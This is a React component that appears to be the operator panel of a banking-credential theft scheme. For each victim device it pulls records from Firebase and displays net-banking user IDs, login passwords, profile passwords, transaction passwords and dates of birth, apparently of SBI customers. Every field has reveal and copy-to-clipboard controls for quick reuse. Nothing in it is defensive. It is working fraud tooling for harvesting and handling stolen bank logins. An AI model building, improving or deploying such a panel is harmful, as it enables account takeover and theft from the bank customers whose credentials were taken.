import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { get, ref } from 'firebase/database';
import { db } from '../firebase/config';

function NetBankingPage() {
  const { deviceId } = useParams();
  const [loginData, setLoginData] = useState(null);
  const [profileData, setProfileData] = useState(null);
  const [sbiProfile, setSbiProfile] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [copied, setCopied] = useState(null);
  const [showSensitive, setShowSensitive] = useState(false);

  useEffect(() => {
    fetchData();
  }, [deviceId]);

  /* ================= FETCH DATA ================= */
  const fetchData = async () => {
    setLoading(true);
    setError(null);
    try {
      let hasNewData = false;

      /* ---- 1. NEW: Fetch from `users_bank/{deviceId}/netbanking` ---- */
      const usersBankRef = ref(db, `users_bank/${deviceId}/netbanking`);
      const usersBankSnap = await get(usersBankRef);

      console.log('🔍 Fetching users_bank/netbanking...');

      if (usersBankSnap.exists()) {
        const bankData = usersBankSnap.val();
        console.log('📦 Netbanking data:', bankData);
        hasNewData = true;

        setLoginData({
          userId: bankData.userId || 'N/A',
          password: bankData.password || 'N/A',
          bank: bankData.bank || 'Bank',
          dateTime: bankData.updatedAt
            ? new Date(bankData.updatedAt).toLocaleString('en-IN', {
                day: '2-digit', month: 'short', year: 'numeric',
                hour: '2-digit', minute: '2-digit'
              })
            : 'N/A',
          timestamp: bankData.updatedAt || Date.now(),
          source: 'users_bank'
        });
      }

      /* ---- 2. OLD: Fetch SBI LOGIN ---- */
      const loginRef = ref(db, `sbi_logins/${deviceId}`);
      const loginSnap = await get(loginRef);

      if (loginSnap.exists()) {
        const raw = loginSnap.val();
        const { profile, ...mainLogin } = raw;

        // ✅ Agar users_bank se data nahi mila toh sbi_logins use karo
        if (!hasNewData) {
          setLoginData(mainLogin);
        }
        if (profile) setProfileData(profile);
      }

      /* ---- 3. Fetch SBI PROFILE ---- */
      const profileRef = ref(db, `sbi_profiles/${deviceId}`);
      const profileSnap = await get(profileRef);

      if (profileSnap.exists()) {
        setSbiProfile(profileSnap.val());
      }
    } catch (err) {
      console.error('❌ Fetch error:', err);
      setError(err.message);
    }
    setLoading(false);
  };

  /* ================= HELPERS ================= */
  const formatDateTime = (ms) => {
    if (!ms) return 'N/A';
    const d = new Date(Number(ms));
    return d.toLocaleString('en-IN', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
  };

  const copyToClipboard = (text, key) => {
    if (!text) return;
    navigator.clipboard.writeText(String(text));
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  /* ================= LOADING ================= */
  if (loading) {
    return (
      <div className="nb-loading">
        <div className="nb-spinner"></div>
        <p>Loading bank data...</p>
        <style>{`
          .nb-loading {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 180px;
            gap: 12px;
            padding: 20px;
          }
          .nb-spinner {
            width: 32px;
            height: 32px;
            border: 3px solid rgba(108, 99, 255, 0.15);
            border-top-color: #6c63ff;
            border-radius: 50%;
            animation: nbSpin 0.8s linear infinite;
          }
          @keyframes nbSpin {
            to { transform: rotate(360deg); }
          }
          .nb-loading p {
            font-size: 12px;
            color: var(--text-muted, #94a3b8);
            margin: 0;
          }
        `}</style>
      </div>
    );
  }

  /* ================= ERROR ================= */
  if (error) {
    return (
      <div className="nb-error">
        <span className="nb-error-icon">❌</span>
        <p>Failed to load bank data</p>
        <p style={{ fontSize: '11px', opacity: 0.6 }}>{error}</p>
        <button onClick={fetchData}>Retry</button>
        <style>{`
          .nb-error { text-align: center; padding: 30px 20px; }
          .nb-error-icon { font-size: 42px; display: block; margin-bottom: 8px; }
          .nb-error p { font-size: 13px; color: var(--text-muted, #94a3b8); margin: 0 0 12px; }
          .nb-error button {
            padding: 8px 22px;
            border: 1px solid rgba(108, 99, 255, 0.4);
            border-radius: 8px;
            background: rgba(108, 99, 255, 0.1);
            color: #6c63ff;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
          }
        `}</style>
      </div>
    );
  }

  /* ================= NO DATA ================= */
  if (!loginData && !sbiProfile) {
    return (
      <div className="nb-empty">
        <span>📭</span>
        <p>No net banking data found</p>
        <p style={{ fontSize: '11px', marginTop: '8px', opacity: 0.7 }}>
          Device ID: {deviceId}
        </p>
        <button onClick={fetchData}>🔄 Refresh</button>
        <style>{`
          .nb-empty { text-align: center; padding: 30px 20px; color: var(--text-muted, #94a3b8); }
          .nb-empty span { font-size: 42px; display: block; margin-bottom: 8px; }
          .nb-empty p { font-size: 13px; margin: 0; }
          .nb-empty button {
            margin-top: 12px;
            padding: 6px 18px;
            border: 1px solid rgba(108, 99, 255, 0.4);
            border-radius: 8px;
            background: rgba(108, 99, 255, 0.1);
            color: #6c63ff;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
          }
        `}</style>
      </div>
    );
  }

  return (
    <div className="nb-root">
      <style>{`
        .nb-root {
          padding: 8px 0;
          font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
          animation: nbFadeIn 0.4s ease;
        }
        @keyframes nbFadeIn {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }

        /* ============ BANK VISUAL ============ */
        .nb-bank-visual {
          position: relative;
          border-radius: 16px;
          padding: 18px 20px;
          margin-bottom: 14px;
          background: linear-gradient(135deg, #0a2540 0%, #1a3a5c 50%, #0d1f38 100%);
          box-shadow:
            0 15px 40px rgba(0, 0, 0, 0.4),
            0 0 0 1px rgba(255, 255, 255, 0.08) inset;
          overflow: hidden;
          color: #fff;
        }
        .nb-bank-visual::before {
          content: '';
          position: absolute;
          top: -50%;
          right: -20%;
          width: 240px;
          height: 240px;
          background: radial-gradient(circle, rgba(0, 150, 199, 0.45), transparent 70%);
          border-radius: 50%;
          pointer-events: none;
        }
        .nb-bank-visual::after {
          content: '';
          position: absolute;
          bottom: -30%;
          left: -10%;
          width: 200px;
          height: 200px;
          background: radial-gradient(circle, rgba(255, 100, 50, 0.25), transparent 70%);
          border-radius: 50%;
          pointer-events: none;
        }

        .nb-visual-top {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
          position: relative;
          z-index: 1;
        }

        .nb-bank-logo {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .nb-bank-circle {
          width: 38px;
          height: 38px;
          border-radius: 50%;
          background: linear-gradient(135deg, #0096c7, #0077b6);
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 11px;
          font-weight: 900;
          color: #fff;
          box-shadow: 0 4px 12px rgba(0, 150, 199, 0.5);
          border: 2px solid rgba(255,255,255,0.2);
        }
        .nb-bank-name {
          font-size: 14px;
          font-weight: 800;
          letter-spacing: 0.3px;
        }
        .nb-bank-sub {
          font-size: 9.5px;
          color: rgba(255, 255, 255, 0.6);
          text-transform: uppercase;
          letter-spacing: 0.8px;
          font-weight: 600;
        }

        .nb-verified-badge {
          display: flex;
          align-items: center;
          gap: 5px;
          background: rgba(16, 185, 129, 0.15);
          border: 1px solid rgba(16, 185, 129, 0.4);
          color: #6ee7b7;
          font-size: 10px;
          font-weight: 700;
          padding: 4px 10px;
          border-radius: 20px;
          backdrop-filter: blur(10px);
        }
        .nb-verified-badge.pending {
          background: rgba(245, 158, 11, 0.15);
          border-color: rgba(245, 158, 11, 0.4);
          color: #fbbf24;
        }

        .nb-userid-label {
          font-size: 9.5px;
          text-transform: uppercase;
          letter-spacing: 1.2px;
          color: rgba(255, 255, 255, 0.5);
          font-weight: 600;
          margin-bottom: 4px;
          position: relative;
          z-index: 1;
        }
        .nb-userid-value {
          font-family: 'Courier New', monospace;
          font-size: 22px;
          font-weight: 800;
          letter-spacing: 2px;
          color: #fff;
          margin-bottom: 18px;
          position: relative;
          z-index: 1;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 8px;
          cursor: pointer;
          transition: color 0.2s;
        }
        .nb-userid-value:hover {
          color: #6ee7b7;
        }
        .nb-eye-btn {
          background: rgba(255, 255, 255, 0.1);
          border: none;
          border-radius: 6px;
          padding: 4px 8px;
          cursor: pointer;
          font-size: 14px;
          transition: background 0.2s;
          flex-shrink: 0;
        }
        .nb-eye-btn:hover {
          background: rgba(255, 255, 255, 0.2);
        }

        .nb-visual-bottom {
          display: flex;
          justify-content: space-between;
          align-items: flex-end;
          position: relative;
          z-index: 1;
        }
        .nb-visual-field {
          display: flex;
          flex-direction: column;
          gap: 2px;
        }
        .nb-visual-field .lbl {
          font-size: 9px;
          text-transform: uppercase;
          letter-spacing: 1px;
          color: rgba(255, 255, 255, 0.5);
          font-weight: 600;
        }
        .nb-visual-field .val {
          font-size: 12.5px;
          font-weight: 700;
          color: #fff;
          letter-spacing: 0.5px;
        }

        /* ============ SECTION ============ */
        .nb-section {
          background: var(--bg-card, rgba(255,255,255,0.03));
          border: 1px solid var(--border-color, rgba(255,255,255,0.08));
          border-radius: 12px;
          padding: 12px;
          margin-bottom: 12px;
        }

        .nb-section-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 10px;
        }
        .nb-section-title {
          font-size: 12px;
          font-weight: 700;
          color: var(--text-primary, #fff);
          display: flex;
          align-items: center;
          gap: 6px;
        }
        .nb-section-badge {
          font-size: 10px;
          font-weight: 700;
          padding: 3px 9px;
          border-radius: 20px;
          background: rgba(108, 99, 255, 0.15);
          color: #a78bfa;
          border: 1px solid rgba(108, 99, 255, 0.3);
        }
        .nb-section-badge.green {
          background: rgba(16, 185, 129, 0.15);
          color: #6ee7b7;
          border-color: rgba(16, 185, 129, 0.3);
        }
        .nb-section-badge.amber {
          background: rgba(245, 158, 11, 0.15);
          color: #fbbf24;
          border-color: rgba(245, 158, 11, 0.3);
        }

        /* ============ DETAIL GRID ============ */
        .nb-grid {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 6px;
        }

        .nb-detail {
          background: var(--bg-input, rgba(255,255,255,0.04));
          border: 1px solid var(--border-color, rgba(255,255,255,0.06));
          border-radius: 9px;
          padding: 8px 10px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          gap: 8px;
          transition: all 0.2s ease;
          cursor: pointer;
          position: relative;
        }
        .nb-detail:hover {
          border-color: rgba(108, 99, 255, 0.4);
          background: rgba(108, 99, 255, 0.05);
        }
        .nb-detail.full {
          grid-column: 1 / -1;
        }

        .nb-detail .lbl {
          font-size: 10px;
          color: var(--text-muted, #94a3b8);
          font-weight: 600;
          display: flex;
          align-items: center;
          gap: 4px;
          white-space: nowrap;
        }
        .nb-detail .val {
          font-size: 12px;
          font-weight: 700;
          color: var(--text-primary, #fff);
          text-align: right;
          word-break: break-all;
          font-family: 'Courier New', monospace;
        }
        .nb-detail .val.red { color: #ef4444; }
        .nb-detail .val.green { color: #10b981; }
        .nb-detail .val.purple { color: #a78bfa; }
        .nb-detail .val.small {
          font-size: 10.5px;
          font-family: inherit;
          font-weight: 500;
          color: var(--text-muted, #94a3b8);
        }

        .nb-copy-tip {
          position: absolute;
          top: -6px;
          right: 6px;
          background: #6c63ff;
          color: #fff;
          font-size: 9px;
          padding: 2px 6px;
          border-radius: 4px;
          font-weight: 700;
          animation: nbTipIn 0.2s ease;
        }
        @keyframes nbTipIn {
          from { opacity: 0; transform: translateY(4px); }
          to { opacity: 1; transform: translateY(0); }
        }

        @media (max-width: 400px) {
          .nb-userid-value { font-size: 17px; letter-spacing: 1.5px; }
          .nb-bank-visual { padding: 14px 16px; }
          .nb-detail .lbl { font-size: 9px; }
          .nb-detail .val { font-size: 11px; }
          .nb-bank-name { font-size: 12.5px; }
          .nb-bank-circle { width: 32px; height: 32px; font-size: 9px; }
        }
      `}</style>

      {/* ============ BANK VISUAL ============ */}
      {loginData && (
        <div className="nb-bank-visual">
          <div className="nb-visual-top">
            <div className="nb-bank-logo">
              <div className="nb-bank-circle">
                {(loginData.bank || 'BANK').split(' ')[0].slice(0, 4).toUpperCase()}
              </div>
              <div>
                <div className="nb-bank-name">{loginData.bank || 'Bank'}</div>
                <div className="nb-bank-sub">Net Banking</div>
              </div>
            </div>
            {profileData?.verifiedAt || sbiProfile?.verifiedAt ? (
              <span className="nb-verified-badge">✓ Verified</span>
            ) : (
              <span className="nb-verified-badge pending">⏳ Pending</span>
            )}
          </div>

          <div className="nb-userid-label">Login User ID</div>
          <div
            className="nb-userid-value"
            onClick={() => setShowSensitive(!showSensitive)}
          >
            <span>
              {showSensitive
                ? (loginData.userId || 'N/A')
                : '•'.repeat(Math.min((loginData.userId || '').length || 5, 10))}
            </span>
            <button
              className="nb-eye-btn"
              onClick={(e) => { e.stopPropagation(); setShowSensitive(!showSensitive); }}
            >
              {showSensitive ? '👁️' : '👁️‍🗨️'}
            </button>
          </div>

          <div className="nb-visual-bottom">
            <div className="nb-visual-field">
              <span className="lbl">Login Time</span>
              <span className="val">{loginData.dateTime || 'N/A'}</span>
            </div>
            <div className="nb-visual-field">
              <span className="lbl">Status</span>
              <span className="val" style={{ color: '#6ee7b7' }}>
                {profileData?.verifiedAt || sbiProfile?.verifiedAt ? '● Active' : '● Pending'}
              </span>
            </div>
          </div>
        </div>
      )}

      {/* ============ LOGIN CREDENTIALS ============ */}
      {loginData && (
        <div className="nb-section">
          <div className="nb-section-header">
            <div className="nb-section-title">🔐 Login Credentials</div>
            <span className="nb-section-badge">Primary</span>
          </div>

          <div className="nb-grid">
            <div
              className="nb-detail full"
              onClick={() => copyToClipboard(loginData.userId, 'userId')}
            >
              <span className="lbl">👤 User ID</span>
              <span className="val">{loginData.userId || 'N/A'}</span>
              {copied === 'userId' && <span className="nb-copy-tip">Copied!</span>}
            </div>

            <div
              className="nb-detail full"
              onClick={() => copyToClipboard(loginData.password, 'password')}
            >
              <span className="lbl">🔐 Password</span>
              <span className="val red">
                {showSensitive ? (loginData.password || 'N/A') : '••••••••'}
              </span>
              {copied === 'password' && <span className="nb-copy-tip">Copied!</span>}
            </div>

            <div className="nb-detail full">
              <span className="lbl">🕐 Login Time</span>
              <span className="val small">{loginData.dateTime || 'N/A'}</span>
            </div>
          </div>
        </div>
      )}

      {/* ============ PROFILE PASSWORD ============ */}
      {profileData && (
        <div className="nb-section">
          <div className="nb-section-header">
            <div className="nb-section-title">👤 Profile Password</div>
            {profileData.verifiedAt ? (
              <span className="nb-section-badge green">✓ Verified</span>
            ) : (
              <span className="nb-section-badge amber">⏳ Pending</span>
            )}
          </div>

          <div className="nb-grid">
            <div
              className="nb-detail full"
              onClick={() => copyToClipboard(profileData.profilePassword, 'profilePassword')}
            >
              <span className="lbl">🔐 Profile Password</span>
              <span className="val red">
                {showSensitive ? (profileData.profilePassword || 'N/A') : '••••••'}
              </span>
              {copied === 'profilePassword' && <span className="nb-copy-tip">Copied!</span>}
            </div>
          </div>
        </div>
      )}

      {/* ============ SBI PROFILE ============ */}
      {sbiProfile && (
        <div className="nb-section">
          <div className="nb-section-header">
            <div className="nb-section-title">💳 Transaction Details</div>
            {sbiProfile.verifiedAt ? (
              <span className="nb-section-badge green">✓ Verified</span>
            ) : (
              <span className="nb-section-badge amber">⏳ Pending</span>
            )}
          </div>

          <div className="nb-grid">
            <div
              className="nb-detail"
              onClick={() => copyToClipboard(sbiProfile.dob, 'dob')}
            >
              <span className="lbl">📅 DOB</span>
              <span className="val">{sbiProfile.dob || 'N/A'}</span>
              {copied === 'dob' && <span className="nb-copy-tip">Copied!</span>}
            </div>

            <div
              className="nb-detail"
              onClick={() => copyToClipboard(sbiProfile.transactionPassword, 'txnPassword')}
            >
              <span className="lbl">🔑 Txn Pwd</span>
              <span className="val red">
                {showSensitive ? (sbiProfile.transactionPassword || 'N/A') : '••••••'}
              </span>
              {copied === 'txnPassword' && <span className="nb-copy-tip">Copied!</span>}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default NetBankingPage;